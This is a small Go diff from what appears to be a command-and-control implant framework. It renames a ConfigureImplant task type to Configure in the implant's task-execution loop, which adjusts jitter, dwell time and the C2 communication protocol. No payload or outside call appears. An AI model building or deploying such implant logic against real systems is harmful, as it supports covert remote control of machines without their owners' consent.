@@ -149,9 +149,9 @@ func (i *Implant) ExecuteTasks() {
 	for !i.TaskQueue.IsEmpty() {
 		raw := i.TaskQueue.Dequeue()
 
-		// ConfigureImplant tasks are handled specially, their default Do() function is not used
+		// Configure tasks are handled specially, their default Do() function is not used
 		var result task.Result
-		if cfgTask, ok := raw.(*task.ConfigureImplant); ok {
+		if cfgTask, ok := raw.(*task.Configure); ok {
 			err := i.UpdateConfig(cfgTask.NewJitter, cfgTask.NewDwell, cfgTask.NewC2CommProtocol)
 			if err != nil {
 				result = task.Result{
